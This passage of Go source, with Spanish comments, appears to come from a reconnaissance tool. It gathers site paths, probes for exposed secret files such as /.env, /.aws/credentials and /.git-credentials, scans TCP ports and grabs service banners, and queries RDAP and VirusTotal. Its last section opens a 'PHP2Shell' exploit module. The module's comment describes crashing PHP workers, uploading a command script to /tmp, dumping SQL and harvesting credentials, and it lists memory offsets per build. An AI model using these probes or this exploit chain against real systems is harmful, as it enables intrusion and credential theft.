// Comprobaciones de exposición: archivos/paneles sensibles que no deberían ser públicos.
// Solo se ejecutan en modo activo autorizado. No es fuerza bruta masiva: es una lista
// corta y revisable, con límite de concurrencia y sin seguir redirecciones externas.
var exposureChecks = []struct {
	path, note, sev string
}{
	{"/.git/HEAD", "Repositorio Git expuesto: puede permitir descargar el código fuente.", "high"},
	{"/.git/config", "Configuración de Git expuesta (posibles URLs/credenciales de remoto).", "high"},
	{"/.env", "Archivo de entorno expuesto: suele contener credenciales y claves.", "critical"},
	{"/.svn/entries", "Metadatos de Subversion expuestos.", "medium"},
	{"/.hg/requires", "Repositorio Mercurial expuesto.", "medium"},
	{"/.DS_Store", "Archivo .DS_Store: revela nombres de ficheros del directorio.", "low"},
	{"/server-status", "mod_status de Apache expuesto: revela peticiones en curso.", "medium"},
	{"/phpinfo.php", "phpinfo() expuesto: revela configuración y rutas del servidor.", "medium"},
	{"/.well-known/security.txt", "security.txt presente (informativo).", "info"},
	{"/backup.zip", "Posible copia de seguridad descargable.", "high"},
	{"/.aws/credentials", "Credenciales de AWS expuestas.", "critical"},
	{"/config.php.bak", "Copia de seguridad de configuración expuesta.", "high"},
	{"/wp-config.php.bak", "Copia de wp-config expuesta: credenciales de WordPress.", "critical"},
	{"/.vscode/sftp.json", "Config SFTP de VS Code: posibles credenciales.", "high"},
	{"/actuator/env", "Spring Boot Actuator /env expuesto: variables de entorno.", "high"},
	{"/.git-credentials", "Credenciales de Git almacenadas y expuestas.", "critical"},
}

func hPaths(ctx context.Context, b map[string]any) (any, error) {
	domain := cleanHost(firstNonEmpty(str(b, "domain"), str(b, "target")))
	if domain == "" {
		return nil, fmt.Errorf("falta 'domain'")
	}
	base := strings.TrimSpace(str(b, "base"))
	if base == "" && validDomain(domain) {
		base = "https://" + domain
	}
	var baseURL *url.URL
	if base != "" {
		if u, err := url.Parse(base); err == nil && (u.Scheme == "http" || u.Scheme == "https") && u.Hostname() != "" {
			baseURL = u
		}
	}

	set := &pathSet{m: map[string]map[string]bool{}}
	var warns []string
	var wmu sync.Mutex
	okSources := []string{}
	warn := func(s string) { wmu.Lock(); warns = append(warns, s); wmu.Unlock() }
	ok := func(s string) { wmu.Lock(); okSources = append(okSources, s); wmu.Unlock() }

	var wg sync.WaitGroup
	// Pasivas (OSINT): no tocan el objetivo salvo robots/sitemap (ficheros públicos).
	if validDomain(domain) {
		wg.Add(2)
		go func() {
			defer wg.Done()
			if err := fetchWaybackPaths(ctx, domain, set); err != nil {
				warn("Wayback: " + err.Error())
			} else {
				ok("Wayback")
			}
		}()
		go func() {
			defer wg.Done()
			if err := fetchOTXPaths(ctx, domain, set); err != nil {
				warn("OTX: " + err.Error())
			} else {
				ok("OTX")
			}
		}()
	}
	if baseURL != nil {
		wg.Add(1)
		go func() {
			defer wg.Done()
			if n, err := fetchRobotsSitemap(ctx, baseURL, set); err != nil {
				warn("robots/sitemap: " + err.Error())
			} else {
				ok(fmt.Sprintf("robots/sitemap (%d)", n))
			}
		}()
	}
	wg.Wait()
	if ctx.Err() != nil {
		return nil, ctx.Err()
	}

	paths := set.list()
	truncated := false
	if len(paths) > 1000 {
		paths, truncated = paths[:1000], true
	}

	res := map[string]any{"paths": paths, "count": len(paths), "truncated": truncated,
		"sources": strings.Join(okSources, " + ")}

	// Activas: comprobaciones de exposición, solo con autorización explícita.
	active, _ := b["active"].(bool)
	authorized, _ := b["authorized"].(bool)
	if active {
		if !authorized {
			res["exposure_note"] = "Comprobaciones de exposición omitidas: falta authorized=true."
		} else if baseURL == nil {
			res["exposure_note"] = "Comprobaciones de exposición omitidas: no hay URL base válida (dominio/HTTP)."
		} else {
			exp, checked := runExposureChecks(ctx, baseURL)
			res["exposures"] = exp
			res["exposure_checked"] = checked
		}
	}
	if len(warns) > 0 {
		res["warnings"] = warns
	}
	return res, nil
}

func fetchWaybackPaths(ctx context.Context, domain string, set *pathSet) error {
	u := "https://web.archive.org/cdx/search/cdx?url=" + url.QueryEscape(domain) +
		"/&output=json&fl=original&collapse=urlkey&limit=10000"
	code, body, err := getJSONBody(ctx, u, 40*time.Second, 24<<20, nil)
	if err != nil {
		return fmt.Errorf("no accesible")
	}
	if code != 200 {
		return fmt.Errorf("HTTP %d", code)
	}
	var rows [][]string
	if json.Unmarshal(body, &rows) != nil {
		return fmt.Errorf("respuesta no JSON")
	}
	for i, r := range rows {
		if i == 0 || len(r) == 0 {
			continue
		}
		set.add(r[0], "Wayback")
	}
	return nil
}

func fetchOTXPaths(ctx context.Context, domain string, set *pathSet) error {
	u := "https://otx.alienvault.com/api/v1/indicators/domain/" + url.PathEscape(domain) + "/url_list?limit=500&page=1"
	code, body, err := getJSONBody(ctx, u, 20*time.Second, 12<<20, nil)
	if err != nil {
		return fmt.Errorf("no accesible")
	}
	if code != 200 {
		return fmt.Errorf("HTTP %d", code)
	}
	var j struct {
		URLList []struct {
			URL string `json:"url"`
		} `json:"url_list"`
	}
	if json.Unmarshal(body, &j) != nil {
		return fmt.Errorf("respuesta no JSON")
	}
	for _, r := range j.URLList {
		set.add(r.URL, "OTX")
	}
	return nil
}

var reSitemapLoc = regexp.MustCompile(`(?i)<loc>\s*(.*?)\s*</loc>`)

// fetchRobotsSitemap lee robots.txt y sitemap.xml (ficheros públicos) del objetivo.
func fetchRobotsSitemap(ctx context.Context, base url.URL, set *pathSet) (int, error) {
	n := 0
	robots := base.Scheme + "://" + base.Host + "/robots.txt"
	if code, body, err := getBody(ctx, robots, 10*time.Second, 512<<10); err == nil && code == 200 {
		for _, line := range strings.Split(string(body), "\n") {
			line = strings.TrimSpace(line)
			low := strings.ToLower(line)
			if strings.HasPrefix(low, "disallow:") || strings.HasPrefix(low, "allow:") {
				v := strings.TrimSpace(line[strings.Index(line, ":")+1:])
				if v != "" && v != "/" {
					set.add(v, "robots.txt")
					n++
				}
			} else if strings.HasPrefix(low, "sitemap:") {
				set.add(strings.TrimSpace(line[strings.Index(line, ":")+1:]), "robots.txt (sitemap)")
			}
		}
	}
	sitemap := base.Scheme + "://" + base.Host + "/sitemap.xml"
	if code, body, err := getBody(ctx, sitemap, 12*time.Second, 4<<20); err == nil && code == 200 {
		for _, m := range reSitemapLoc.FindAllSubmatch(body, 3000) {
			set.add(html.UnescapeString(string(m[1])), "sitemap.xml")
			n++
		}
	}
	return n, nil
}

func runExposureChecks(ctx context.Context, base *url.URL) ([]map[string]any, int) {
	tr := &http.Transport{
		Proxy:               http.ProxyFromEnvironment,
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		TLSHandshakeTimeout: 6 * time.Second,
	}
	defer tr.CloseIdleConnections()
	cl := &http.Client{
		Transport: tr,
		Timeout:   8 * time.Second,
		// No se siguen redirecciones: un 301 a /login no es una exposición.
		CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse },
	}
	var out []map[string]any
	var mu sync.Mutex
	sem := make(chan struct{}, 6) // límite de concurrencia: no castigar al servidor
	var wg sync.WaitGroup
	checked := 0
	for _, c := range exposureChecks {
		if ctx.Err() != nil {
			break
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(path, note, sev string) {
			defer wg.Done()
			defer func() { <-sem }()
			target := base.Scheme + "://" + base.Host + path
			req, err := http.NewRequestWithContext(ctx, "GET", target, nil)
			if err != nil {
				return
			}
			req.Header.Set("User-Agent", userAgent)
			resp, err := cl.Do(req)
			mu.Lock()
			checked++
			mu.Unlock()
			if err != nil {
				return
			}
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
			resp.Body.Close()
			// Solo se reporta un 200 con contenido plausible (no una página de error 200 genérica).
			if resp.StatusCode != 200 || len(bytes.TrimSpace(body)) == 0 {
				return
			}
			ct := strings.ToLower(resp.Header.Get("Content-Type"))
			if strings.HasPrefix(path, "/.") && strings.Contains(ct, "text/html") {
				return // ficheros ocultos servidos como HTML suelen ser páginas de error
			}
			mu.Lock()
			out = append(out, map[string]any{
				"path": path, "url": target, "status": resp.StatusCode,
				"severity": sev, "note": note,
				"size": len(body), "content_type": resp.Header.Get("Content-Type"),
			})
			mu.Unlock()
		}(c.path, c.note, c.sev)
	}
	wg.Wait()
	sort.Slice(out, func(i, j int) bool { return out[i]["path"].(string) < out[j]["path"].(string) })
	return out, checked
}

/* ===================== RDAP / ASN / PTR ===================== */

func hRDAP(ctx context.Context, b map[string]any) (any, error) {
	ip := strings.TrimSpace(str(b, "ip"))
	parsed := net.ParseIP(ip)
	if parsed == nil {
		return nil, fmt.Errorf("IP no válida")
	}
	ip = parsed.String()
	ctx, cancel := context.WithTimeout(ctx, 15*time.Second)
	defer cancel()

	out := map[string]any{"ip": ip, "ptr": ""}
	var mu sync.Mutex
	set := func(k string, v any) { mu.Lock(); out[k] = v; mu.Unlock() }
	var wg sync.WaitGroup
	wg.Add(3)

	go func() { // PTR
		defer wg.Done()
		if names, err := resolver.LookupAddr(ctx, ip); err == nil && len(names) > 0 {
			set("ptr", strings.TrimSuffix(names[0], "."))
		}
	}()
	go func() { // RDAP
		defer wg.Done()
		code, body, err := getJSONBody(ctx, "https://rdap.org/ip/"+ip, 12*time.Second, 2<<20,
			map[string]string{"Accept": "application/rdap+json, application/json"})
		if err != nil || code != 200 {
			return
		}
		var d struct {
			Name      string `json:"name"`
			Country   string `json:"country"`
			Handle    string `json:"handle"`
			StartAddr string `json:"startAddress"`
			EndAddr   string `json:"endAddress"`
			Type      string `json:"type"`
			Cidrs     []struct {
				V4     string `json:"v4prefix"`
				V6     string `json:"v6prefix"`
				Length int    `json:"length"`
			} `json:"cidr0_cidrs"`
			Entities []rdapEntity `json:"entities"`
		}
		if json.Unmarshal(body, &d) != nil {
			return
		}
		network := cidrOf(d.StartAddr, d.EndAddr)
		if len(d.Cidrs) > 0 {
			c := d.Cidrs[0]
			network = fmt.Sprintf("%s/%d", firstNonEmpty(c.V4, c.V6), c.Length)
		}
		set("org", firstNonEmpty(vcardFN(d.Entities), d.Name, d.Handle))
		set("netname", d.Name)
		set("country", d.Country)
		set("network", firstNonEmpty(network, d.Handle))
		if t := strings.ToLower(d.Type); strings.Contains(t, "assign") || strings.Contains(t, "alloc") {
			set("type", d.Type)
		}
	}()
	go func() { // ASN vía Team Cymru (DNS TXT)
		defer wg.Done()
		if asn, ck := cymruASN(ctx, parsed); asn != "" {
			set("asn", asn)
			set("asn_country", ck)
		}
	}()
	wg.Wait()

	if c, _ := out["country"].(string); c == "" {
		if ck, _ := out["asn_country"].(string); ck != "" {
			out["country"] = ck
		}
	}
	delete(out, "asn_country")
	return out, nil
}

// cymruASN consulta origin.asn.cymru.com (IPv4) u origin6.asn.cymru.com (IPv6).
func cymruASN(ctx context.Context, ip net.IP) (string, string) {
	var q string
	if p := ip.To4(); p != nil {
		q = fmt.Sprintf("%d.%d.%d.%d.origin.asn.cymru.com", p[3], p[2], p[1], p[0])
	} else {
		h := hex.EncodeToString(ip.To16())
		nibbles := make([]string, 0, 32)
		for i := len(h) - 1; i >= 0; i-- {
			nibbles = append(nibbles, string(h[i]))
		}
		q = strings.Join(nibbles, ".") + ".origin6.asn.cymru.com"
	}
	txts, err := resolver.LookupTXT(ctx, q)
	if err != nil || len(txts) == 0 {
		return "", ""
	}
	// "ASN | prefijo | CC | registro | fecha"
	parts := strings.Split(txts[0], "|")
	if len(parts) < 3 {
		return "", ""
	}
	num := strings.Fields(strings.TrimSpace(parts[0])) // puede traer varios ASN
	if len(num) == 0 {
		return "", ""
	}
	asn := "AS" + num[0]
	cc := strings.TrimSpace(parts[2])
	if nm, err := resolver.LookupTXT(ctx, "AS"+num[0]+".asn.cymru.com"); err == nil && len(nm) > 0 {
		if np := strings.Split(nm[0], "|"); len(np) >= 5 {
			asn += " " + strings.TrimSpace(np[4])
		}
	}
	return asn, cc
}

type rdapEntity struct {
	Roles      []string `json:"roles"`
	VcardArray []any    `json:"vcardArray"`
}

// vcardFN devuelve el nombre de la entidad titular (registrant) o, si no hay, la primera con nombre.
func vcardFN(ents []rdapEntity) string {
	first := ""
	for _, e := range ents {
		fn := ""
		if len(e.VcardArray) >= 2 {
			if arr, ok := e.VcardArray[1].([]any); ok {
				for _, item := range arr {
					if f, ok := item.([]any); ok && len(f) >= 4 {
						if s, _ := f[0].(string); s == "fn" {
							fn, _ = f[3].(string)
						}
					}
				}
			}
		}
		if fn == "" {
			continue
		}
		for _, r := range e.Roles {
			if r == "registrant" {
				return fn
			}
		}
		if first == "" {
			first = fn
		}
	}
	return first
}

func cidrOf(start, end string) string {
	if start == "" {
		return ""
	}
	if end == "" {
		return start
	}
	return start + " – " + end
}

func firstNonEmpty(xs ...string) string {
	for _, x := range xs {
		if strings.TrimSpace(x) != "" {
			return x
		}
	}
	return ""
}

/* ===================== HTTP / TLS ===================== */

func hHTTP(ctx context.Context, b map[string]any) (any, error) {
	raw := strings.TrimSpace(str(b, "url"))
	if raw == "" {
		return nil, fmt.Errorf("falta 'url'")
	}
	schemeGiven := strings.Contains(raw, "://")
	if !schemeGiven {
		raw = "https://" + raw
	}
	u, err := url.Parse(raw)
	if err != nil || (u.Scheme != "http" && u.Scheme != "https") || u.Hostname() == "" {
		return nil, fmt.Errorf("URL no válida")
	}
	res, err := fetchHTTP(ctx, u.String())
	if err != nil && !schemeGiven && ctx.Err() == nil {
		// Sin esquema explícito: si HTTPS falla, se prueba HTTP en claro y se deja constancia.
		u.Scheme = "http"
		if res2, err2 := fetchHTTP(ctx, u.String()); err2 == nil {
			res2["https_error"] = err.Error()
			return res2, nil
		}
	}
	return res, err
}

var reTitle = regexp.MustCompile(`(?is)<title[^>]*>(.*?)</title>`)

func fetchHTTP(ctx context.Context, target string) (map[string]any, error) {
	ctx, cancel := context.WithTimeout(ctx, 15*time.Second)
	defer cancel()
	var redirects []string
	tr := &http.Transport{
		Proxy: http.ProxyFromEnvironment,
		// Se acepta cualquier certificado para poder inspeccionarlo; la validez
		// real se comprueba aparte con x509.Verify y se informa como hallazgo.
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		TLSHandshakeTimeout: 8 * time.Second,
		ForceAttemptHTTP2:   true,
	}
	defer tr.CloseIdleConnections()
	cl := &http.Client{
		Transport: tr,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			redirects = append(redirects, req.URL.String())
			if len(via) >= 8 {
				return fmt.Errorf("demasiadas redirecciones")
			}
			return nil
		},
	}
	req, err := http.NewRequestWithContext(ctx, "GET", target, nil)
	if err != nil {
		return nil, fmt.Errorf("URL no válida")
	}
	req.Header.Set("User-Agent", userAgent)
	resp, err := cl.Do(req)
	if err != nil {
		return nil, fmt.Errorf("no se pudo conectar: %v", err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 256<<10))

	headers := map[string]string{}
	for k, v := range resp.Header {
		if strings.EqualFold(k, "Set-Cookie") {
			continue
		}
		headers[strings.ToLower(k)] = strings.Join(v, ", ")
	}
	cookies := resp.Header.Values("Set-Cookie")
	if cookies == nil {
		cookies = []string{}
	}
	final := resp.Request.URL
	out := map[string]any{
		"host":      final.Hostname(),
		"status":    resp.StatusCode,
		"proto":     resp.Proto,
		"headers":   headers,
		"cookies":   cookies,
		"redirects": redirects,
		"final_url": final.String(),
		"scheme":    final.Scheme,
	}
	if m := reTitle.FindSubmatch(body); m != nil {
		t := strings.Join(strings.Fields(html.UnescapeString(string(m[1]))), " ")
		if len(t) > 200 {
			t = t[:200] + "…"
		}
		out["title"] = t
	}
	if resp.TLS != nil && len(resp.TLS.PeerCertificates) > 0 {
		out["tls"] = tlsInfo(resp.TLS, final.Hostname())
	}
	return out, nil
}

func tlsInfo(cs *tls.ConnectionState, host string) map[string]any {
	c := cs.PeerCertificates[0]
	opts := x509.VerifyOptions{DNSName: host, Intermediates: x509.NewCertPool()}
	for _, ic := range cs.PeerCertificates[1:] {
		opts.Intermediates.AddCert(ic)
	}
	_, verr := c.Verify(opts)
	sans := append([]string{}, c.DNSNames...)
	for _, ip := range c.IPAddresses {
		sans = append(sans, ip.String())
	}
	info := map[string]any{
		"subject":     c.Subject.CommonName,
		"issuer":      firstNonEmpty(c.Issuer.CommonName, c.Issuer.String()),
		"notBefore":   c.NotBefore.UTC().Format(time.RFC3339),
		"notAfter":    c.NotAfter.UTC().Format(time.RFC3339),
		"host":        host,
		"sans":        sans,
		"version":     tls.VersionName(cs.Version),
		"cipher":      tls.CipherSuiteName(cs.CipherSuite),
		"alpn":        cs.NegotiatedProtocol,
		"key":         c.PublicKeyAlgorithm.String(),
		"sig":         c.SignatureAlgorithm.String(),
		"self_signed": c.Subject.String() == c.Issuer.String() && c.CheckSignatureFrom(c) == nil,
		"verified":    verr == nil,
	}
	if verr != nil {
		info["verify_error"] = verr.Error()
	}
	return info
}

/* ===================== Escaneo TCP connect ===================== */

var commonPorts = []int{21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 389, 443, 445, 465, 587, 636, 993, 995,
	1433, 1521, 1723, 2049, 2375, 2376, 3000, 3306, 3389, 5000, 5432, 5601, 5900, 5985, 5986, 6379, 6443,
	8000, 8008, 8080, 8081, 8443, 8888, 9000, 9090, 9200, 9443, 10000, 11211, 27017}

var svcNames = map[int]string{21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "domain", 80: "http",
	110: "pop3", 111: "rpcbind", 135: "msrpc", 139: "netbios-ssn", 143: "imap", 389: "ldap", 443: "https",
	445: "microsoft-ds", 465: "smtps", 587: "submission", 636: "ldaps", 993: "imaps", 995: "pop3s",
	1433: "ms-sql", 1521: "oracle", 1723: "pptp", 2049: "nfs", 2375: "docker", 2376: "docker-tls",
	3000: "http-alt", 3306: "mysql", 3389: "ms-wbt-server", 5000: "http-alt", 5432: "postgresql",
	5601: "kibana", 5900: "vnc", 5985: "winrm", 5986: "winrm-https", 6379: "redis", 6443: "kubernetes-api",
	8000: "http-alt", 8008: "http-alt", 8080: "http-proxy", 8081: "http-alt", 8443: "https-alt",
	8888: "http-alt", 9000: "http-alt", 9090: "http-alt", 9200: "elasticsearch", 9443: "https-alt",
	10000: "webmin", 11211: "memcached", 27017: "mongodb"}

var (
	tlsPorts   = map[int]bool{443: true, 465: true, 636: true, 993: true, 995: true, 2376: true, 5986: true, 6443: true, 8443: true, 9443: true}
	httpPorts  = map[int]bool{80: true, 3000: true, 5000: true, 5601: true, 8000: true, 8008: true, 8080: true, 8081: true, 8888: true, 9000: true, 9090: true, 9200: true, 10000: true}
	httpsPorts = map[int]bool{443: true, 2376: true, 5986: true, 6443: true, 8443: true, 9443: true}
)

const maxScanPorts = 2048

type portResult struct {
	Port    int    `json:"port"`
	Proto   string `json:"proto"`
	State   string `json:"state"`
	Service string `json:"service"`
	Product string `json:"product"`
	Version string `json:"version"`
	Banner  string `json:"banner"`
	Method  string `json:"method"`
	Dur     string `json:"dur"`
}

func parsePorts(b map[string]any) ([]int, error) {
	pl, ok := b["ports"].([]any)
	if !ok || len(pl) == 0 {
		return commonPorts, nil
	}
	seen := map[int]bool{}
	var ports []int
	for _, x := range pl {
		f, ok := x.(float64)
		p := int(f)
		if !ok || f != float64(p) || p < 1 || p > 65535 {
			return nil, fmt.Errorf("puerto no válido: %v", x)
		}
		if !seen[p] {
			seen[p] = true
			ports = append(ports, p)
		}
	}
	if len(ports) > maxScanPorts {
		return nil, fmt.Errorf("demasiados puertos (máximo %d por petición)", maxScanPorts)
	}
	return ports, nil
}

func hScan(ctx context.Context, b map[string]any) (any, error) {
	target := cleanHost(str(b, "target"))
	if target == "" {
		return nil, fmt.Errorf("falta 'target'")
	}
	if auth, _ := b["authorized"].(bool); !auth {
		return nil, fmt.Errorf("escaneo rechazado: falta confirmación de autorización (authorized=true)")
	}
	ports, err := parsePorts(b)
	if err != nil {
		return nil, err
	}
	// resolver a IP si es dominio (se prefiere IPv4)
	host := target
	if net.ParseIP(target) == nil {
		if !validDomain(target) {
			return nil, fmt.Errorf("objetivo no válido")
		}
		ips, err := resolver.LookupIP(ctx, "ip", target)
		if err != nil || len(ips) == 0 {
			return nil, fmt.Errorf("no se pudo resolver el objetivo")
		}
		host = ips[0].String()
		for _, ip := range ips {
			if ip.To4() != nil {
				host = ip.String()
				break
			}
		}
	}

	results := make([]portResult, 0)
	var mu sync.Mutex
	closed, filtered := 0, 0
	sem := make(chan struct{}, 100)
	var wg sync.WaitGroup
	started := time.Now()
	for _, p := range ports {
		if ctx.Err() != nil {
			break
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(port int) {
			defer wg.Done()
			defer func() { <-sem }()
			start := time.Now()
			addr := net.JoinHostPort(host, strconv.Itoa(port))
			d := net.Dialer{Timeout: 1500 * time.Millisecond}
			conn, err := d.DialContext(ctx, "tcp", addr)
			dur := time.Since(start)
			if err != nil {
				mu.Lock()
				if isRefused(err) {
					closed++
				} else {
					filtered++
				}
				mu.Unlock()
				return
			}
			pr := portResult{Port: port, Proto: "tcp", State: "open",
				Service: svcNames[port], Method: "tcp-connect", Dur: fmt.Sprintf("%.2fs", dur.Seconds())}
			grabBanner(conn, host, port, &pr)
			conn.Close()
			mu.Lock()
			results = append(results, pr)
			mu.Unlock()
		}(p)
	}
	wg.Wait()
	if ctx.Err() != nil {
		return nil, fmt.Errorf("escaneo cancelado")
	}
	sort.Slice(results, func(i, j int) bool { return results[i].Port < results[j].Port })
	return map[string]any{"host": host, "target": target, "ports": results,
		"scanned": len(ports), "closed": closed, "filtered": filtered,
		"elapsed": fmt.Sprintf("%.1fs", time.Since(started).Seconds()),
		"note":    "Escaneo TCP connect (sin privilegios). Solo reporta puertos abiertos confirmados; cerrados = conexión rechazada, filtrados = sin respuesta."}, nil
}

func isRefused(err error) bool {
	return errors.Is(err, syscall.ECONNREFUSED) || strings.Contains(strings.ToLower(err.Error()), "refused")
}

var reServer = regexp.MustCompile(`(?i)^server:\s*(.+)$`)
var reProdVer = regexp.MustCompile(`([A-Za-z][A-Za-z0-9.+-]*?)[/ _-]v?(\d+\.\d[0-9A-Za-z.]*)`)
var reSSH = regexp.MustCompile(`SSH-[\d.]+-(\S+)`)

func grabBanner(conn net.Conn, host string, port int, pr *portResult) {
	conn.SetDeadline(time.Now().Add(2 * time.Second))
	switch {
	case tlsPorts[port]:
		cfg := &tls.Config{InsecureSkipVerify: true}
		if net.ParseIP(host) == nil {
			cfg.ServerName = host
		}
		tconn := tls.Client(conn, cfg)
		if err := tconn.Handshake(); err == nil {
			cs := tconn.ConnectionState()
			pr.Banner = tls.VersionName(cs.Version)
			if len(cs.PeerCertificates) > 0 {
				pr.Banner += " · CN=" + cs.PeerCertificates[0].Subject.CommonName
			}
			if httpsPorts[port] {
				fmt.Fprintf(tconn, "HEAD / HTTP/1.0\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n", host, userAgent)
				readHTTPBanner(tconn, pr)
			}
		}
	case httpPorts[port]:
		fmt.Fprintf(conn, "HEAD / HTTP/1.0\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n", host, userAgent)
		readHTTPBanner(conn, pr)
	default:
		// servicios que envían banner al conectar (ssh, ftp, smtp…)
		br := bufio.NewReader(conn)
		line, _ := br.ReadString('\n')
		line = sanitizeBanner(line)
		if line != "" {
			pr.Banner = line
			if m := reSSH.FindStringSubmatch(line); m != nil {
				setProdVer(pr, m[1])
			} else if m := reProdVer.FindStringSubmatch(line); m != nil {
				pr.Product, pr.Version = m[1], m[2]
			}
		}
	}
}

// sanitizeBanner elimina caracteres de control y limita la longitud.
func sanitizeBanner(s string) string {
	s = strings.Map(func(r rune) rune {
		if r < 0x20 || r == 0x7f {
			return -1
		}
		return r
	}, strings.TrimSpace(s))
	if len(s) > 200 {
		s = s[:200]
	}
	return s
}

func readHTTPBanner(r io.Reader, pr *portResult) {
	br := bufio.NewReader(r)
	for i := 0; i < 40; i++ {
		line, err := br.ReadString('\n')
		if line == "" && err != nil {
			break
		}
		line = strings.TrimSpace(line)
		if i == 0 && strings.HasPrefix(line, "HTTP/") && pr.Service == "" {
			pr.Service = "http"
		}
		if m := reServer.FindStringSubmatch(line); m != nil {
			srv := sanitizeBanner(m[1])
			if srv == "" {
				continue
			}
			if pr.Banner == "" {
				pr.Banner = "Server: " + srv
			} else {
				pr.Banner += " · Server: " + srv
			}
			setProdVer(pr, srv)
		}
		if line == "" {
			break
		}
	}
}

func setProdVer(pr *portResult, s string) {
	if m := reProdVer.FindStringSubmatch(s); m != nil {
		pr.Product, pr.Version = m[1], m[2]
	} else if f := strings.Fields(s); pr.Product == "" && len(f) > 0 {
		pr.Product = f[0]
	}
}

/* ===================== VirusTotal (opcional) ===================== */

var (
	vtMu  sync.RWMutex
	vtKey string
)

func getVT() string { vtMu.RLock(); defer vtMu.RUnlock(); return vtKey }
func setVT(k string) { vtMu.Lock(); vtKey = strings.TrimSpace(k); vtMu.Unlock() }

// loadVTKey: la clave puede venir de la variable de entorno o de vtkey.txt junto al binario.
func loadVTKey() {
	if k := os.Getenv("ETOOLWEB_VT_KEY"); k != "" {
		setVT(k)
		return
	}
	if exe, err := os.Executable(); err == nil {
		if b, err := os.ReadFile(filepath.Join(filepath.Dir(exe), "vtkey.txt")); err == nil {
			setVT(string(b))
		}
	}
}

var reVTKey = regexp.MustCompile(`^[A-Fa-f0-9]{64}$`)

func hConfig(_ context.Context, b map[string]any) (any, error) {
	if _, ok := b["clear"]; ok {
		setVT("")
	} else if k := str(b, "vt_key"); k != "" {
		if !reVTKey.MatchString(k) {
			return nil, fmt.Errorf("formato de clave no válido (se esperan 64 caracteres hexadecimales)")
		}
		setVT(k)
	}
	return map[string]any{"ok": true, "vt": getVT() != ""}, nil
}

func vtGet(ctx context.Context, path string) (map[string]any, error) {
	key := getVT()
	if key == "" {
		return nil, fmt.Errorf("configura la clave de VirusTotal en la pestaña APIs")
	}
	code, body, err := getJSONBody(ctx, "https://www.virustotal.com/api/v3"+path, 15*time.Second, 8<<20,
		map[string]string{"x-apikey": key})
	if err != nil {
		return nil, fmt.Errorf("VirusTotal no accesible")
	}
	switch code {
	case 200:
	case 401:
		return nil, fmt.Errorf("clave de VirusTotal no válida")
	case 404:
		return nil, fmt.Errorf("VirusTotal no tiene datos de este objetivo")
	case 429:
		return nil, fmt.Errorf("límite de VirusTotal alcanzado (4/min, 500/día)")
	default:
		return nil, fmt.Errorf("VirusTotal HTTP %d", code)
	}
	var j map[string]any
	if json.Unmarshal(body, &j) != nil {
		return nil, fmt.Errorf("respuesta de VirusTotal no válida")
	}
	return j, nil
}

func fetchVTSubs(ctx context.Context, domain string, set *subSet, _ *ipSet) error {
	j, err := vtGet(ctx, "/domains/"+url.PathEscape(domain)+"/subdomains?limit=40")
	if err != nil {
		return err
	}
	if arr, ok := j["data"].([]any); ok {
		for _, it := range arr {
			if m, ok := it.(map[string]any); ok {
				if id, ok := m["id"].(string); ok {
					set.add(id, domain, "VirusTotal")
				}
			}
		}
	}
	return nil
}

func hVT(ctx context.Context, b map[string]any) (any, error) {
	typ := str(b, "type")
	val := cleanHost(str(b, "value"))
	if val == "" {
		return nil, fmt.Errorf("falta 'value'")
	}
	base := "/domains/" + url.PathEscape(val)
	if typ == "ip" {
		ip := net.ParseIP(val)
		if ip == nil {
			return nil, fmt.Errorf("IP no válida")
		}
		base = "/ip_addresses/" + ip.String()
	} else {
		typ = "domain"
		if !validDomain(val) {
			return nil, fmt.Errorf("dominio no válido")
		}
	}
	j, err := vtGet(ctx, base)
	if err != nil {
		return nil, err
	}
	out := map[string]any{"type": typ, "value": val}
	if data, ok := j["data"].(map[string]any); ok {
		if attr, ok := data["attributes"].(map[string]any); ok {
			out["reputation"] = attr["reputation"]
			out["last_analysis_stats"] = attr["last_analysis_stats"]
			if c, ok := attr["categories"]; ok {
				out["categories"] = c
			}
			if typ == "ip" {
				out["asn"] = attr["asn"]
				out["as_owner"] = attr["as_owner"]
				out["country"] = attr["country"]
			}
		}
	}
	if res, err := vtGet(ctx, base+"/resolutions?limit=20"); err == nil {
		list := []map[string]any{}
		if arr, ok := res["data"].([]any); ok {
			for _, it := range arr {
				if m, ok := it.(map[string]any); ok {
					if a, ok := m["attributes"].(map[string]any); ok {
						e := map[string]any{"date": a["date"]}
						if typ == "domain" {
							e["ip"] = a["ip_address"]
						} else {
							e["host"] = a["host_name"]
						}
						list = append(list, e)
					}
				}
			}
		}
		out["passive_dns"] = list
	}
	return out, nil
}

/* ===================== PHP2Shell — explotación PRO (CVE-2026-109618 / CVE-2026-109619) =====================
   Cadena "aslr-leak" 100% HTTP contra PHP prefork/mod_php, endurecida:
     - Salida delimitada por marcadores aleatorios → extracción fiable aunque la app devuelva HTML.
     - Auto-layout: prueba los perfiles conocidos y VALIDA con centinela «uid=» antes de usarlos.
     - Transporte con keep-alive (menos handshakes), ClientHello tipo navegador y pacing con jitter.
     - Post-explotación: script maestro subido a /tmp (comandos ilimitados) + volcado SQL.
     - Cosecha de memoria con deduplicación; extracción de secretos y credenciales de BD.
   Intrusivo por diseño: provoca fatales OOM, reinicia workers y fuerza el ASLR.
*/

type p2sProfile struct {
	Key, Desc                           string
	ZifOffset, DtorOffset, HtdataOffset uint64
	Stage1N, Stage2T, Stage2V           int
}

var p2sProfiles = []p2sProfile{
	{"official", "php:8.4/8.5-apache · Debian 13 (trixie)", 0x465370, 0x65EB60, 0x690D8, 841, 406, 16},
	{"official83", "php:8.3-apache · Debian 13", 0x3AC080, 0x49EC50, 0x6A0D8, 841, 406, 16},
	{"lab", "PHP 8.4.26 + Apache 2.4.68 (build propio)", 0x43A870, 0x613C50, 0x6E0D8, 892, 443, 1},
}

func p2sProfileOrder(sel string) []p2sProfile {
	var out []p2sProfile
	for _, p := range p2sProfiles {
		if p.Key == sel {
			out = append(out, p)
		}
	}
	for _, p := range p2sProfiles {
		if p.Key != sel {
